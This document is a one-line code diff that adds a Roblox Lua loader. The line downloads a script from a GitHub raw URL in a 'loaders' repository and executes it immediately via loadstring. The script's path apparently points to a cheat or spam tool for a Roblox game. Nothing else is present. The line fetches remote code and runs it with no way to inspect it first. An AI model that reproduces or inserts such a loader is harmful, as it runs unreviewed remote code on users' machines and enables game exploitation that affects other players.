@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/pets-universe-spam3-w4i0xyasgh0hyj.lua"))()
